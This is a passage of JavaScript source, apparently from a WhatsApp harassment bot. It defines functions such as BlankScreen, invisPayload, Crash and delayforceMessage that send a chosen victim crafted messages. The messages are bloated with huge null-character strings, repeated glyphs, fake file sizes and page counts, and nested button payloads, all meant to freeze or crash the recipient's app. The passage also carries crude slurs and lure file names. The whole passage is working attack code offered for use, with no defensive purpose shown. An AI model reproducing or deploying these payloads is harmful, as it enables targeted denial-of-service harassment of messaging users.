                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "©21WithNoKids",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "CTR",
                        sections: [{
                          title: "Cx",
                          rows: [{
                            title: "ΛIƧƬΛЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: bijipler,
                    mentions: bijipler
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: bijipler
            }
          });
          await Zeph.relayMessage(bijipler, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "©21WithNoKids" + ggg,
                  address: "",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: bijipler
            }
          });
          await Zeph.relayMessage(bijipler, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"©21WithNoKids\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: bijipler
            }
          });
          await Zeph.relayMessage(bijipler, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "Brum Brum Brum🚙..",
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: bijipler,
                    mentions: bijipler,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: bijipler
            }
          });
        }
        
async function BlankScreen(bijipler, Ptcp = false) {
  	const jids = `_*~@6285805338638~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
			await Zeph.relayMessage(bijipler, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "sockXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "Freze" + jids + ui,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["6285805338638@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: bijipler
					}
				}:{}
			);
       }
       
  async function invisPayload(bijipler) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u0000".repeat(900000);
        let deepNested = {
          title: "\u0000".repeat(900000),
          highlight_label: "\u0000".repeat(900000),
          rows: [
            {
              title: largeText,
              id: "\u0000".repeat(900000),
              subrows: [
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                  subsubrows: [
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                  ],
                },
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u0000".repeat(900000),
        sections: sections,
      };
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
              stanzaId: Zeph.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [bijipler],
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 19316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
							},
					   },
              },
              body: {
                text: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                ],
              },
            },
          },
        },
      };
      await Zeph.relayMessage(bijipler, message, {
        participant: { jid: bijipler },
    });
}

async function Crash(bijipler) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   " + "ꦾ".repeat(25000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Zeph.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 39567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "  🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒  ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
                },
                contentText: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
                footerText: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/testi_hwuwhw99",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
              thumbnail: "",
              sourceUrl: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
              sourceId: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰   ",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: ` 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃰     - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "  🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒⃔͒⃰   ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Zeph.relayMessage(bijipler, messagePayload, {
    participant: { jid: bijipler},
  });
}     
 
 async function delayforceMessage(bijipler) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: Zeph.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " 🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒ ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "  🦠⃟͒  ⃨⃨⃨©21WithNoKids ヶ⃔͒   "
                    },
                },
              },
            body: {
              text: "⿻© 𝟮𝟭𝗪ιƚԋ𝗡σ𝗞ιԃʂ⃟⿻   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await Zeph.relayMessage(bijipler, message, {
      participant: { jid: bijipler },
    });
  } 
  async function UniXCrashClick(Zeph, bijipler) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "UNiX" + "ꦽ".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Zeph.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [bijipler],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "UNiX",
